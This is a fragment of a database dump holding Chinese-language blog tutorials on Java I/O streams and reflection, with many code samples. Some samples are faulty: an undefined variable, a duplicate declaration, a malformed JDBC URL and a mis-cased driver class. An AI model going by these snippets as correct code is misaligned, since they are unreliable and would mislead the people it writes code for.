java.io.IOException;\n​\npublic class ByteStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp.txt\";\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fis = new FileInputStream(filePath);\n&nbsp;&nbsp;&nbsp;&nbsp;byte[] bytes = new byte[3];\n&nbsp;&nbsp;&nbsp;&nbsp;int a = fis.read(bytes);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(a);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(bytes));\n&nbsp;&nbsp;&nbsp;&nbsp;int b = fis.read(bytes);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(b);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(bytes));\n&nbsp;&nbsp;&nbsp;&nbsp;int c = fis.read(bytes);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(c);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(bytes));\n&nbsp;&nbsp;&nbsp;&nbsp;int d = fis.read(bytes);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(d);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(bytes));\n&nbsp;}\n}*\n</pre><p>由于每次读到内存中的byte数组中的数据不会刷新而会覆盖,当读到最后的数据不足字节数组的长度时则会出现数据重复,因而可以使用方法new String(byte[] bytes,int offset,int length)来获取每次读到的有效数据长度</p><p>new String(byte[] bytes,int offset)</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileInputStream;\nimport java.io.IOException;\n​\npublic class ByteStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp.txt\";\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fis = new FileInputStream(filePath);\n&nbsp;&nbsp;&nbsp;&nbsp;byte[] bytes = new byte[3];\n&nbsp;&nbsp;&nbsp;&nbsp;int temp;\n&nbsp;&nbsp;&nbsp;&nbsp;while ((temp = fis.read(bytes)) != -1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(bytes, 0, temp));\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\n</pre><h3>FileOutputStream</h3><p>文件字节输出流: 将内存中的数据写入计算机硬盘中</p><p>void write(byte[] bytes)</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n​\npublic class ByteStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;// 文件不存在则自动创建\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp\";\n&nbsp;&nbsp;&nbsp;&nbsp;// true表示追加写,默认为false覆盖写\n&nbsp;&nbsp;&nbsp;&nbsp;FileOutputStream fos = new FileOutputStream(filePath, true);\n&nbsp;&nbsp;&nbsp;&nbsp;String s = \"Hello World\";\n&nbsp;&nbsp;&nbsp;&nbsp;byte[] bytes = s.getBytes();\n&nbsp;&nbsp;&nbsp;&nbsp;fos.write(bytes);\n&nbsp;&nbsp;&nbsp;&nbsp;fos.close();\n&nbsp;}\n}\n</pre><p>void write(byte[] bytes,int offset,int length)</p><p>将字节数组的一部分写入</p><h3>使用字节流完成文件的复制</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n​\npublic class ByteStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp\";\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fis = new FileInputStream(filePath);\n&nbsp;&nbsp;&nbsp;&nbsp;FileOutputStream fos = new FileOutputStream(\"src/io/temp.txt\", true);\n&nbsp;&nbsp;&nbsp;&nbsp;byte[] bytes = new byte[1024];\n&nbsp;&nbsp;&nbsp;&nbsp;int temp;\n&nbsp;&nbsp;&nbsp;&nbsp;while ((temp = fis.read(bytes)) != -1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fos.write(bytes, 0, temp);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;fos.close();\n&nbsp;&nbsp;&nbsp;&nbsp;fis.close();\n&nbsp;}\n}\n</pre><h3>FileReader</h3><p>文件字符输入流</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileReader;\nimport java.io.IOException;\n​\npublic class CharStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp\";\n&nbsp;&nbsp;&nbsp;&nbsp;FileReader fr = new FileReader(filePath);\n&nbsp;&nbsp;&nbsp;&nbsp;char[] ch = new char[512];\n&nbsp;&nbsp;&nbsp;&nbsp;int temp;\n&nbsp;&nbsp;&nbsp;&nbsp;while ((temp = fr.read(ch)) != -1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(new String(ch, 0, temp));\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\n</pre><h3>FileWriter</h3><p>文件字符输出流</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileWriter;\nimport java.io.IOException;\n​\npublic class CharStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp\";\n&nbsp;&nbsp;&nbsp;&nbsp;FileWriter fw = new FileWriter(filePath, true);\n&nbsp;&nbsp;&nbsp;&nbsp;String s = \"hello\";\n&nbsp;&nbsp;&nbsp;&nbsp;char[] ch = {\'h\', \'e\', \'l\', \'l\', \'o\'};\n&nbsp;&nbsp;&nbsp;&nbsp;// 直接写入字符串\n&nbsp;&nbsp;&nbsp;&nbsp;fw.write(s);\n&nbsp;&nbsp;&nbsp;&nbsp;// 写入部分字符串\n&nbsp;&nbsp;&nbsp;&nbsp;fw.write(s, 0, 2);\n&nbsp;&nbsp;&nbsp;&nbsp;// 写入字符数组\n&nbsp;&nbsp;&nbsp;&nbsp;fw.write(ch);\n&nbsp;&nbsp;&nbsp;&nbsp;// 写入部分字符数组\n&nbsp;&nbsp;&nbsp;&nbsp;fw.write(ch, 0, 3);&nbsp;&nbsp;\n&nbsp;&nbsp;&nbsp;&nbsp;fw.close();\n&nbsp;}\n}\n</pre><h3>使用字符流完成文件的复制</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.FileWriter;\nimport java.io.IOException;\n​\npublic class CharStream {\n&nbsp;&nbsp;public static void main(String[] args) throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;FileReader fr = new FileReader(\"src/io/temp\");\n&nbsp;&nbsp;&nbsp;&nbsp;FileWriter fw = new FileWriter(\"src/io/temp.txt\", true);\n&nbsp;&nbsp;&nbsp;&nbsp;char[] ch = new char[512];\n&nbsp;&nbsp;&nbsp;&nbsp;int temp;\n&nbsp;&nbsp;&nbsp;&nbsp;while ((temp = fr.read(ch)) != -1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fw.write(ch, 0, temp);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;fw.close();\n&nbsp;&nbsp;&nbsp;&nbsp;fr.close();\n&nbsp;}\n}\n</pre><h3>BufferedInputStream</h3><p>带有缓冲区的字节输入流</p><h3>BufferedOutputStream</h3><p>带有缓冲区的字节输出流</p><h3>BufferedReader</h3><p>带有缓冲区的字符输入流</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.*;\n\npublic class CharStream {\n    public static void main(String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new FileReader(\"src/io/temp\"));\n        String temp;\n        // 每次读取一行\n        while ((temp = br.readLine()) != null) {  \n            System.out.println(temp);\n        }\n    }\n}\npackage io;\n\nimport java.io.*;\n\npublic class CharStream {\n    public static void main(String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new FileReader(\"src/io/temp\"));\n        char[] ch = new char[512];\n        int temp;\n        // 每次读取一个k\n        while ((temp = br.read(ch)) != -1) {   \n            System.out.println(new String(ch, 0, temp));\n        }\n    }\n}\npackage io;\n\nimport java.io.*;\n\npublic class CharStream {\n    public static void main(String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new FileReader(\"src/io/temp\"));\n        char[] ch = new char[512];\n        int temp;\n        // 每次只会读取一个字符长度的数据存到数组中\n        while ((temp = br.read(ch, 0, 1)) != -1) {    \n            System.out.println(new String(ch, 0, temp));\n        }\n    }\n}\n</pre><h3>BufferedWriter</h3><p>带有缓冲区的字符输出流</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.*;\n\npublic class CharStream {\n    public static void main(String[] args) throws IOException {\n        BufferedWriter bw = new BufferedWriter(new FileWriter(\"src/io/temp\", true));\n        bw.write(\"hello\");\n        bw.newLine();\n        bw.close();\n    }\n}\n</pre><p>BufferedWriter和FileWriter使用方法差不多,前者可以换行</p><h3>使用BufferedReader和BufferedWriter</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.*;\nimport java.util.*;\n\npublic class Io_ArrayListRandom {\n    public static void main(String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(\"src/io/temp\"), \"GBK\"));\n        ArrayList&lt;String&gt; arr = new ArrayList&lt;&gt;();\n        String s;\n        while ((s = br.readLine()) != null) {\n            arr.add(s);\n        }\n        br.close();\n        Random r = new Random();\n        int index = r.nextInt(arr.size());//产生大小在集合长度范围内的下标\n        System.out.println(arr.get(index));\n        arr.remove(index);                //移出随机产生下标对应的数据        \n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(\"src/io/temp\", true), \"GBK\"));\n        for (String name : arr) {         //将剩下的数据写入原来文件中\n            bw.write(name);\n            bw.newLine();\n        }\n        bw.close();\n    }\n}\n</pre><h3>InputStreamReader</h3><p>转换流（字节输入流 --&gt; 字符输入流 ）</p><pre class=\"ql-syntax\" spellcheck=\"false\">BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(\"src/io/temp\")));\n</pre><h3>OutputStreamWriter</h3><p>转换流（字节输出流 --&gt; 字符输出流 ）</p><pre class=\"ql-syntax\" spellcheck=\"false\">BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(\"src/io/temp\",true)));\n</pre><h3>PrintStream</h3><p>标准的输出流,默认以字节的方式打印到控制台</p><pre class=\"ql-syntax\" spellcheck=\"false\">PrintStream ps = System.out;\nps.println(\"\"); ---&gt; System.out.println(\"\");\npackage io;\n\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.PrintStream;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class Io_PrintStream {\n    public static void main(String[] args) {\n        try {\n            // System默认打印到控制台\n            PrintStream ps = System.out;\n            ps.println(\"java\");\n            // 通过setOut方法改变打印输出方向\n            System.setOut(new PrintStream(new FileOutputStream(\"src/io/log\")));\n            System.out.println(new SimpleDateFormat(\"yyyy-MM-dd HH-mm-ss\").format(new Date()));\n            System.out.println(\"打印日志\");\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}\n</pre><h3>PrintWriter</h3><p>以字符方式</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.*;\n\npublic class Io_PrintStream {\n    public static void main(String[] args) throws IOException {\n        PrintWriter pw = new PrintWriter(new FileWriter(\"src/io/temp\", true));\n        String[] dest = new String[]{\"hello\", \"world\"};\n        for (String s : dest) {\n            // 自动刷新和换行\n            pw.println(s);     \n        }\n        // 必须关闭\n        pw.close();             \n    }\n}\n</pre><h3>boolean endWith()</h3><p>寻找所有以.dll结尾的文件</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.File;\n\npublic class ListFiles {\n    public static void main(String[] args) {\n        String filePath = \"\";\n        File f = new File(filePath);\n        File[] files = f.listFiles();\n        for (File file : files) {\n            if (file.isFile()) {\n                if (file.getName().endsWith(\".dll\")) {\n                    System.out.println(file.getName());\n                }\n            }\n        }\n    }\n}\npackage io;\n\nimport java.io.File;\n\npublic class ListFiles {\n    public static void main(String[] args) {\n        String filePath = \"\";\n        File folder = new File(filePath);\n        File[] fileArray = folder.listFiles((dir, name) -&gt; new File(dir, name).isFile() &amp;&amp; name.endsWith(\".dll\"));\n        assert fileArray != null;\n        for (File file : fileArray) {\n            System.out.println(file.getName());\n        }\n    }\n}\n</pre><h3>递归遍历一个文件夹下所有的文件</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.File;\n\npublic class FileList {\n    public static void fileList(File target) {\n        if (target.isFile()) {\n            return;\n        }\n        File[] files = target.listFiles();\n        for (File file : files) {\n            System.out.println(file.getName());\n            fileList(file);\n        }\n    }\n\n    public static void main(String[] args) {\n        String filePath = \"\";\n        fileList(new File(filePath));\n    }\n}\n</pre><h3>复制文件并更改后缀名</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class ChangeName {\n    public static void copy(File file, File newFile) throws IOException {\n        BufferedInputStream fis = new BufferedInputStream(new FileInputStream(file));\n        BufferedOutputStream fos = new BufferedOutputStream(new FileOutputStream(newFile, true));\n        byte[] bs = new byte[1024];\n        int len;\n        while ((len = fis.read(bs)) != -1) {\n            fos.write(bs, 0, len);\n        }\n        fos.close();\n        fis.close();\n    }\n\n    public static void main(String[] args) throws IOException {\n        String targetFile = \"\";\n        String destFile = \"\";\n        File target = new File(targetFile);\n        File dest = new File(destFile);\n        if (!dest.exists()) ff.mkdir();\n        File[] files = target.listFiles();\n        assert files != null;\n        for (File file : files) {\n            String name = file.getName();\n            System.out.println(name);\n            name = name.replace(\".java\", \".txt\");\n            File newFile = new File(dest, name);\n            copy(file, newFile);\n        }\n    }\n}\n</pre><h3>Scanner</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.File;\nimport java.io.FileNotFoundException;\nimport java.util.Scanner;\n\npublic class Scanner {\n    public static void main(String[] args) {\n        try {\n            File file = new File(\"src/io/temp\");\n            Scanner sc = new Scanner(file);\n            while (sc.hasNext()) {\n                System.out.println(sc.next());\n            }\n            sc.close();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}\n</pre><h3>LineNumberReader</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.LineNumberReader;\n\npublic class LineNumberReader {\n    public static void main(String[] args) throws IOException {\n        LineNumberReader lnr = new LineNumberReader(new FileReader(\"src/io/temp\"));\n        String s;\n        //设置起当前行数\n        lnr.setLineNumber(100);\n        while ((s = lnr.readLine()) != null) {\n            System.out.println(lnr.getLineNumber() + \":\" + s);\n        }\n        lnr.close();\n    }\n}\n</pre><h3>ByteArrayOutputStream</h3><p>内存操作流: 数据在内存中转一圈</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\n\npublic class ByteArray {\n    public static void main(String[] args) throws IOException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        baos.write(\"hello\".getBytes());\n        byte[] bs = baos.toByteArray();\n        ByteArrayInputStream bais = new ByteArrayInputStream(bs);\n        int len;\n        while ((len = bais.read()) != -1) {\n            System.out.print((char) len);\n        }\n    }\n}\n</pre><ul><li>磁盘操作:File</li><li>字节操作:InputStream 和 OutputStream</li><li>字符操作:Reader 和 Writer</li><li>对象操作:Serializable</li><li>网络操作: Socket</li><li>新的输入/输出:NIO</li></ul><p>复制图片,视频,音频等:只能用字节流,而不能使用字符流</p><p>复制纯文本可以使用字符流.</p><p>用字节流向文件中写入数据时,必须要转换为字节类型或用字节数组,比如字符串是直接写不进去的</p><p>而用字符流时用字符串和字符都行</p><p>字节流在使用后没有关闭写数据管道时仍然可以成功写入数据（带有缓冲区的除外）</p><p>字符流在使用后没有关闭写数据管道时,此时写入数据失败,系统就会认为还有数据一直在等待中,使用flush方法强行写入</p><h3>通过键盘输入的两种方法</h3><p>1:通过Scanner方法</p><pre class=\"ql-syntax\" spellcheck=\"false\"> Scanner sc=new Scanner(System.in);//System.in是一个标准的输入流 默认接受键盘的输入\n</pre><p>2:通过BufferedReader</p><pre class=\"ql-syntax\" spellcheck=\"false\">BufferedReader input=new BufferedReader(new InputStreamReader(System.in));\n        String s=input.readLine();\n        input.close();\n</pre><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7OaARNJ_AADzsBlCvrI38.jpeg',2,0,'220226DP09K1F0SW','目录目录IO常用的流FileInputStreamFileOutputStream使用字节流完成文件的复制FileReaderFileWriter使用字符流完成文件的复制BufferedInputStreamBufferedOutputStreamBufferedReaderBufferedWriter使用BufferedReader和BufferedWriterInputStreamReader',0,0,0,NULL,0,0,'2022-02-12 06:23:49','2022-04-24 06:23:49','[\"220329D180W7F2RP\",\"220424A7NM5WNA15\"]',NULL),('220424A85AYWB06W','Java 反射','<p><strong style=\"color: rgb(65, 131, 196);\">反射</strong></p><p><span style=\"color: rgb(65, 131, 196);\">获取Class类型对象的三种方式</span></p><p><span style=\"color: rgb(65, 131, 196);\">Properties类</span></p><p><span style=\"color: rgb(65, 131, 196);\">通过反射创建对象</span></p><p><span style=\"color: rgb(65, 131, 196);\">读取Properties属性文件反射创建对象</span></p><p><span style=\"color: rgb(65, 131, 196);\">User类</span></p><p><span style=\"color: rgb(65, 131, 196);\">Field</span></p><p><span style=\"color: rgb(65, 131, 196);\">获取指定的成员变量</span></p><p><span style=\"color: rgb(65, 131, 196);\">Method</span></p><p><span style=\"color: rgb(65, 131, 196);\">获取指定的方法</span></p><p><span style=\"color: rgb(65, 131, 196);\">Constructor</span></p><p><span style=\"color: rgb(65, 131, 196);\">获取指定的构造方法</span></p><p><span style=\"color: rgb(65, 131, 196);\">父类</span></p><p><span style=\"color: rgb(65, 131, 196);\">父接口</span></p><p><span style=\"color: rgb(65, 131, 196);\">通过反射反编译某个类</span></p><h1>反射</h1><h2>获取Class类型对象的三种方式</h2><ul><li>Class.forName(String className);  className：全限定类名</li><li>全限定类名.class  （java每种类型都有class属性）</li><li>对象.getClass()  返回对象的运行时类 (java中任何一个对象都有getClass() 方法)</li></ul><h2>Properties类</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.io.FileInputStream;\nimport java.util.Properties;\npublic class ReflectTest {\n&nbsp;&nbsp;public static void main(String[] args) throws Exception {\n&nbsp;&nbsp;&nbsp;&nbsp;Properties p = new Properties();\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fin = new FileInputStream(\"resources/jdbc.properties\");\n&nbsp;&nbsp;&nbsp;&nbsp;p.load(fin);\n&nbsp;&nbsp;&nbsp;&nbsp;// key重复则value覆盖\n&nbsp;&nbsp;&nbsp;&nbsp;String p1 = p.getProperty(\"driver\");\n&nbsp;&nbsp;&nbsp;&nbsp;String p2 = p.getProperty(\"url\");\n&nbsp;&nbsp;&nbsp;&nbsp;String p3 = p.getProperty(\"username\");\n&nbsp;&nbsp;&nbsp;&nbsp;String p4 = p.getProperty(\"password\");\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(p1);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(p2);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(p3);\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(p4);\n&nbsp;}\n}\ndriver=com.mysql.cj.jdbc.driver\nurl=mysql:jdbc://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC\nusername=root\npassword=123456\n</pre><p>properties配置文件的key与value之间可以<strong><em>空格</em></strong>分割或者<strong><em>冒号</em></strong>或者<strong><em>等号</em></strong>,同时出现则就近原则</p><h2>通过反射创建对象</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\npublic class A {\n&nbsp;&nbsp;static {\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"类A已被加载到JVM中\");\n&nbsp;}\n&nbsp;&nbsp;public A(){\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"A的无参构造方法执行了\");\n&nbsp;}\n}\npackage reflect;\npublic class Reflect {\n&nbsp;&nbsp;public static void main(String[] args) throws ClassNotFoundException {\n&nbsp;&nbsp;&nbsp;&nbsp;Class.forName(\"reflect.A\"); // 将A.class文件加载到JVM过程中会执行类中的静态方法\n&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt; c = A.class;&nbsp;&nbsp;&nbsp;// 不会执行A中的静态语句块 \n&nbsp;&nbsp;&nbsp;&nbsp;\n&nbsp;&nbsp;&nbsp;&nbsp;\n&nbsp;&nbsp;&nbsp;Class&lt;?&gt; c = Class.forName(\"reflect.A\");\n&nbsp;&nbsp;&nbsp;Object a = c.getConstructor().newInstance();// 会调用无参构造方法,创建对象\n&nbsp;}\n}\n</pre><h2>读取Properties属性文件反射创建对象</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.io.FileInputStream;\nimport java.util.Enumeration;\nimport java.util.Properties;\npublic class ReflectTest {\n&nbsp;&nbsp;public static void main(String[] args) throws Exception {\n&nbsp;&nbsp;&nbsp;&nbsp;Properties p = new Properties();\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fin = new FileInputStream(\"resources/className.properties\");\n&nbsp;&nbsp;&nbsp;&nbsp;p.load(fin);\n&nbsp;&nbsp;&nbsp;&nbsp;fin.close();\n&nbsp;&nbsp;&nbsp;&nbsp;Enumeration&lt;Object&gt; enumeration = p.keys();\n&nbsp;&nbsp;&nbsp;&nbsp;while(enumeration.hasMoreElements()){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String className = p.get(enumeration.nextElement()).toString();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt; c = Class.forName(className);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object date = c.getConstructor().newInstance();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(date);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\ndate=java.util.Date\n</pre><p><br></p><p><br></p><h2>User类</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\npublic class User {\n&nbsp;&nbsp;private int id;\n&nbsp;&nbsp;private String name;\n&nbsp;&nbsp;public String password;\n&nbsp;&nbsp;public User(){\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"User无参构造函数执行了...\");\n&nbsp;}\n&nbsp;&nbsp;public User(String name,String password){\n&nbsp;&nbsp;&nbsp;&nbsp;this.name = name;\n&nbsp;&nbsp;&nbsp;&nbsp;this.password = password;\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"User有参构造方法执行了...\");\n&nbsp;}\n&nbsp;&nbsp;public boolean login(String name,String password){\n&nbsp;&nbsp;&nbsp;&nbsp;return \"admin\".equals(name) &amp;&amp; \"123\".equals(password);\n&nbsp;}\n&nbsp;&nbsp;public void logout(){\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"用户已安全退出...\");\n&nbsp;}\n}\n</pre><h2>Field</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.lang.reflect.Field;\npublic class Reflect {\n&nbsp;&nbsp;public static void main(String[] args) throws Exception {\n&nbsp;&nbsp;&nbsp;Class&lt;?&gt; c = Class.forName(\"reflect.User\");\n&nbsp;&nbsp;&nbsp;&nbsp;Field[] fields = c.getDeclaredFields();// 获取所有的属性\n&nbsp;&nbsp;&nbsp;&nbsp;//Field[] fields = c.getFields();&nbsp;&nbsp;// 1 获取被public修饰的属性\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(fields.length);&nbsp;&nbsp;// 4\n&nbsp;&nbsp;&nbsp;&nbsp;for(Field field : fields){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 返回成员变量的类型的Class类型全限定类名名\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(field.getType() +\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 返回成员变量的类型的全限定类\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(field.getType().getName() + \" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 返回成员变量的类型\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(field.getType().getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 获取成员变量的名称\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(field.getName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 获取成员变量的修饰符\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(Modifier.toString(field.getModifiers()));\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\n</pre><h2>获取指定的成员变量</h2><pre class=\"ql-syntax\" spellcheck=\"false\">Class&lt;?&gt; c = Class.forName(\"reflect.User\");\nObject user = c.getConstructor().newInstance();\nField id = c.getDeclaredField(\"id\");\n// 打破封装\nid.setAccessible(true);\n// 相当于new User().setId(21)\nid.set(user,21);\nSystem.out.println(id.get(user));//21\n</pre><h2>Method</h2><pre class=\"ql-syntax\" spellcheck=\"false\">public class Reflect {\n    public static void main(String[] args) throws Exception {\n       Class&lt;?&gt; c = Class.forName(\"reflect.User\");\n       // 获取类中的所有的方法\n       Method[] methods = c.getDeclaredMethods();\n       for(Method method : methods){\n           // 获取方法的修饰符\n           System.out.println(Modifier.toString(method.getModifiers()));\n           // 获取方法的类型\n           System.out.println(method.getReturnType().getSimpleName());\n           // 获取方法的名称\n           System.out.println(method.getName());\n           // 获取方法形式参数列表\n           Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();\n           for(Class parameterType : parameterTypes){\n               System.out.println(parameterType.getSimpleName());\n           }\n       }\n    }\n}\n</pre><h2>获取指定的方法</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.lang.reflect.Method;\npublic class Reflect {\n    public static void main(String[] args) throws Exception {\n       Class&lt;?&gt; c = Class.forName(\"reflect.User\");\n        // 根据每个方法的方法签名不同来区分每个方法\n       Method method = c.getDeclaredMethod(\"login\", String.class, String.class);\n       Object user = c.getConstructor().newInstance();\n        // returnValue为该方法返回的值\n       Object returnValue = method.invoke(user,\"admin\",\"123\");\n       System.out.println(returnValue); //true\n    }\n}\n</pre><h2>Constructor</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Modifier;\npublic class Reflect {\n    public static void main(String[] args) throws Exception {\n        Class&lt;?&gt; c = Class.forName(\"reflect.User\");\n        // 获取所有的构造方法,包括无参和有参\n        Constructor[] constructors = c.getDeclaredConstructors();\n        for(Constructor constructor : constructors){\n            // 获取构造函数的修饰符\n            System.out.println(Modifier.toString(constructor.getModifiers()));\n            // 获取构造函数的名称\n            System.out.println(constructor.getName());\n            // 获取构造函数的形式参数列表\n            Class&lt;?&gt;[] parameterTypes = constructor.getParameterTypes();\n            for(Class parameterType : parameterTypes){\n                System.out.println(parameterType.getSimpleName());\n            }\n        }\n    }\n}\n</pre><h2>获取指定的构造方法</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.lang.reflect.Constructor;\npublic class Reflect {\n    public static void main(String[] args) throws Exception {\n        Class&lt;?&gt; c = Class.forName(\"reflect.User\");\n        // 根据构造函数的形式参数列表不同区别每个构造函数\n       Constructor constructor = c.getDeclaredConstructor(String.class, String.class);\n       constructor.newInstance(\"admin\",\"123\");// 通过有参构造函数来创建User对象\n    }\n}\n</pre><h2>父类</h2><pre class=\"ql-syntax\" spellcheck=\"false\">Class&lt;?&gt; c = Class.forName(\"java.util.Date\");\n// 父类\nObject fa = c.getSuperclass();\nSystem.out.println(fa);\n</pre><h2>父接口</h2><pre class=\"ql-syntax\" spellcheck=\"false\">Class&lt;?&gt; c = Class.forName(\"java.util.Date\");\n// 父接口\nClass&lt;?&gt;[] fatherInterfaces = c.getInterfaces();\nfor(Class&lt;?&gt; fatherInterface: fatherInterfaces){\n    System.out.println(fatherInterface);\n}\n</pre><h2>通过反射反编译某个类</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package reflect;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\npublic class Reflect {\n&nbsp;Class&lt;?&gt; c = Class.forName(\"thread.AlternatePrint\");\n&nbsp;&nbsp;&nbsp;&nbsp;StringBuilder str = new StringBuilder();\n&nbsp;&nbsp;&nbsp;&nbsp;str.append(Modifier.toString(c.getModifiers()));\n&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" class 